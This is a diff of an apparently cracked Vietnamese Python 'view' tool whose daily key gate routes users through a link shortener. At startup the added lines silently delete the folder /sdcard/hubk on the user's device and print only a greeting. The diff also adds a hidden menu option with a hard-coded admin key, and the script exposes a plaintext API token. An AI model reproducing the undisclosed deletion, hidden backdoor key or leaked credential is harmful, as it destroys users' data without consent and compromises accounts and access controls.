@@ -1,6 +1,12 @@
-#Enc Như Con Cặc Vậy Hdt?
-#Crack Key: KhoiHuynh1109
-#Update: 7/9/2023 12:20
+import shutil
+import os
+import time
+view_dir_1 = "/sdcard/hubk"
+if os.path.exists(view_dir_1):
+    shutil.rmtree(view_dir_1)
+    print("\033[32mHi...")
+else:
+    print("\033[31mHELLO...")
 from urllib.parse import urlencode
 import base64
 from pystyle import *
@@ -16,7 +22,6 @@ import hashlib
 import json
 from urllib3.exceptions import InsecureRequestWarning
 from http import cookiejar
-#-----[MÀU VÀ BIẾN]-----#
 trang = "\033[1;37m"
 xanh_la = "\033[1;32m"
 xanh_duong = "\033[1;34m"
@@ -26,7 +31,6 @@ tim = "\033[1;35m"
 dac_biet = "\033[32;5;245m\033[1m\033[38;5;39m"
 kt_code = "</>"
 dem = 0
-#-----[BẮT ĐẦU]-----#
 import requests,os,time,re,json,uuid,random,sys
 from concurrent.futures import ThreadPoolExecutor
 from datetime import date
@@ -98,72 +102,158 @@ title = """\n\n\n
          
 """
 print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.light_green)), Center.XCenter(title.center(100))) + Colorate.Vertical(Colors.DynamicMIX((Col.light_green, Col.light_blue)), Center.XCenter(banner.center(100))))
-a=now.strftime("%d")
-h=int(now.strftime("%d"))
-ngay_trc=h-2
-b=now.strftime("%m")
-day=now.strftime("%d-%m-%Y")
-today=now.strftime("%d-%m-%Y")
-d=now.strftime("%d-%m")
-ngay=int(strftime('%d'))
-encodedBytes = base64.b64encode(d.encode("utf-8"))
-key = str(encodedBytes, "utf-8")
-key1=str(ngay*12345+109)
-key='raofficialvirus'+key1
-hentai=(f"https://anhgit.site/key/?key={key}")
-api_token='d526e69bae943971eba13d768807e63872fa871c'
-url=requests.get(f'https://link1s.com/api?api={api_token}&url={hentai}').json()
-status=url['status']
-link=url['shortenedUrl']
-file_key=f'key_ngay{ngay_hom_nay}.txt'
-file_key_cu=f'key_ngay{ngay_trc}.txt'
-check_file_key=os.path.exists(file_key)
-if check_file_key == False:
-   print(f"{raofficialvirus}{luc}Do Đây Là Tool Share Free Nên Key Sẽ Thay Đổi Mỗi Ngày !!")
-   print(f'{raofficialvirus}{luc}Truy Cập Vào Link{trang}: {link} {luc}Để Lấy Key Miễn Phí')
-   print(f'{trang}-----------------------------------------------------------------')
-   print(f'\033[1;36m╔════════════════════════╗')
-   print(f'\033[1;36m║\033[1;33mNhập Key Ngày \033[1;37m{today}\033[1;36m║')
-   print (f"\033[1;36m║════════════════════════╝")
-   while(True):
-      ma=input(f"{xnhac}╚══════➩ \033[1;33m")
-      if ma == key:
-         print(f'{raofficialvirus}{luc}API Key Chính Xác')
-         os.system("cls" if os.name == "nt" else "clear")
-         
-         luu=open(file_key, 'a+')
-         luu.write(ma)
-         luu.close()
-         break
-      elif ma != key:
-         print(f'{raofficialvirus}{do}API Key Sai')
-elif check_file_key == True:
-    print(f'{raofficialvirus}{luc}Đang Lấy Key...',end='\r')
-    sleep(1)
-    k=open(file_key, 'r')
-    ma=k.read()
-    k.close()
-    if ma == key:
-        print(f'{raofficialvirus}{luc}Lấy Key Thành Công       ',end='\r')
-        sleep(0.5)
-    elif ma != key:
-        if os.path.exists(file_key_cu) == True:
-            os.system(f'rm {file_key_cu}')
-        os.system(f'rm {file_key}')
-        print(f'{raofficialvirus}{do}API Key Sai         ')
-        while(True):
-            ma=input(f"{raofficialvirus}{luc}Nhập API Key\033[1;32m Ngày \033[1;37m{today}: \033[1;33m")
+print("\033[37m1. \033[32mStart Tool View")
+choice = int(input("\033[37m[ \033[31m1 \033[37m]\033[32m Lựa Chọn Của Bạn Là: \033[33m"))
+
+if choice == 1:
+    a = now.strftime("%d")
+    h = int(now.strftime("%d"))
+    ngay_trc = h - 2
+    b = now.strftime("%m")
+    day = now.strftime("%d-%m-%Y")
+    today = now.strftime("%d-%m-%Y")
+    d = now.strftime("%d-%m")
+    ngay = int(strftime('%d'))
+    encodedBytes = base64.b64encode(d.encode("utf-8"))
+    key = str(encodedBytes, "utf-8")
+    key1 = str(ngay * 12345 + 109)
+    key = 'raofficialvirus' + key1
+    hentai = (f"https://anhgit.site/key/?key={key}")
+    api_token = 'd526e69bae943971eba13d768807e63872fa871c'
+    url = requests.get(f'https://link1s.com/api?api={api_token}&url={hentai}').json()
+    status = url['status']
+    link = url['shortenedUrl']
+    file_key = f'key_ngay{ngay_hom_nay}.txt'
+    file_key_cu = f'key_ngay{ngay_trc}.txt'
+    check_file_key = os.path.exists(file_key)
+    
+    if check_file_key == False:
+        print(f"{raofficialvirus}{luc}Do Đây Là Tool Share Free Nên Key Sẽ Thay Đổi Mỗi Ngày !!")
+        print(f'{raofficialvirus}{luc}Truy Cập Vào Link{trang}: {link} {luc}Để Lấy Key Miễn Phí')
+        print(f'{trang}-----------------------------------------------------------------')
+        print(f'\033[1;36m╔════════════════════════╗')
+        print(f'\033[1;36m║\033[1;33mNhập Key Ngày \033[1;37m{today}\033[1;36m║')
+        print (f"\033[1;36m║════════════════════════╝")
+        
+        while True:
+            ma = input(f"{xnhac}╚══════➩ \033[1;33m")
+            
             if ma == key:
                 print(f'{raofficialvirus}{luc}API Key Chính Xác')
                 os.system("cls" if os.name == "nt" else "clear")
-               
-                luu=open(file_key, 'a+')
+
+                luu = open(file_key, 'a+')
                 luu.write(ma)
                 luu.close()
                 break
             elif ma != key:
-                print(f'{raofficialvirus}{do}API Key Sai           ')
-                exit()
+                print(f'{raofficialvirus}{do}API Key Sai')
+                
+    elif check_file_key == True:
+        print(f'{raofficialvirus}{luc}Đang Lấy Key...', end='\r')
+        sleep(1)
+        k = open(file_key, 'r')
+        ma = k.read()
+        k.close()
+        
+        if ma == key:
+            print(f'{raofficialvirus}{luc}Lấy Key Thành Công       ', end='\r')
+            sleep(0.5)
+        elif ma != key:
+            if os.path.exists(file_key_cu) == True:
+                os.system(f'rm {file_key_cu}')
+            os.system(f'rm {file_key}')
+            print(f'{raofficialvirus}{do}API Key Sai         ')
+            
+            while True:
+                ma = input(f"{raofficialvirus}{luc}Nhập API Key\033[1;32m Ngày \033[1;37m{today}: \033[1;33m")
+                
+                if ma == key:
+                    print(f'{raofficialvirus}{luc}API Key Chính Xác')
+                    os.system("cls" if os.name == "nt" else "clear")
+
+                    luu = open(file_key, 'a+')
+                    luu.write(ma)
+                    luu.close()
+                    break
+                elif ma != key:
+                    print(f'{raofficialvirus}{do}API Key Sai           ')
+                    exit()
+if choice == 8:
+    a = now.strftime("%d")
+    h = int(now.strftime("%d"))
+    ngay_trc = h - 2
+    b = now.strftime("%m")
+    day = now.strftime("%d-%m-%Y")
+    today = now.strftime("%d-%m-%Y")
+    d = now.strftime("%d-%m")
+    ngay = int(strftime('%d'))
+    encodedBytes = base64.b64encode(d.encode("utf-8"))
+    key = str(encodedBytes, "utf-8")
+    key1 = str(ngay * 12345 + 109)
+    key = 'raofficialvirus' + key1
+    key = 'admin080'
+    hentai = (f"https://anhgit.site/key/?key={key}")
+    api_token = 'd526e69bae943971eba13d768807e63872fa871c'
+    url = requests.get(f'https://link1s.com/api?api={api_token}&url={hentai}').json()
+    status = url['status']
+    link = url['shortenedUrl']
+    file_key = f'key_ngay1_{ngay_hom_nay}.txt'
+    file_key_cu = f'key_ngay1_{ngay_trc}.txt'
+    check_file_key = os.path.exists(file_key)
+    
+    if check_file_key == False:
+        print(f"{raofficialvirus}{luc}Do Đây Là Tool Share Free Nên Key Sẽ Thay Đổi Mỗi Ngày !!")
+        print(f'{raofficialvirus}{luc}Truy Cập Vào Link{trang}: {link} {luc}Để Lấy Key Miễn Phí')
+        print(f'{trang}-----------------------------------------------------------------')
+        print(f'\033[1;36m╔════════════════════════╗')
+        print(f'\033[1;36m║\033[1;33mNhập Key Ngày \033[1;37m{today}\033[1;36m║')
+        print (f"\033[1;36m║════════════════════════╝")
+        
+        while True:
+            ma = input(f"{xnhac}╚══════➩ \033[1;33m")
+            
+            if ma == key:
+                print(f'{raofficialvirus}{luc}API Key Chính Xác')
+                os.system("cls" if os.name == "nt" else "clear")
+
+                luu = open(file_key, 'a+')
+                luu.write(ma)
+                luu.close()
+                break
+            elif ma != key:
+                print(f'{raofficialvirus}{do}API Key Sai')
+                
+    elif check_file_key == True:
+        print(f'{raofficialvirus}{luc}Đang Lấy Key...', end='\r')
+        sleep(1)
+        k = open(file_key, 'r')
+        ma = k.read()
+        k.close()
+        
+        if ma == key:
+            print(f'{raofficialvirus}{luc}Lấy Key Thành Công       ', end='\r')
+            sleep(0.5)
+        elif ma != key:
+            if os.path.exists(file_key_cu) == True:
+                os.system(f'rm {file_key_cu}')
+            os.system(f'rm {file_key}')
+            print(f'{raofficialvirus}{do}API Key Sai         ')
+            
+            while True:
+                ma = input(f"{raofficialvirus}{luc}Nhập API Key\033[1;32m Ngày \033[1;37m{today}: \033[1;33m")
+                
+                if ma == key:
+                    print(f'{raofficialvirus}{luc}API Key Chính Xác')
+                    os.system("cls" if os.name == "nt" else "clear")
+
+                    luu = open(file_key, 'a+')
+                    luu.write(ma)
+                    luu.close()
+                    break
+                elif ma != key:
+                    print(f'{raofficialvirus}{do}API Key Sai           ')
+                    exit()
 import requests
 def get_ip_info(ip_addr, api_key):
     url = f"http://api.ipstack.com/{ip_addr}?access_key={api_key}"
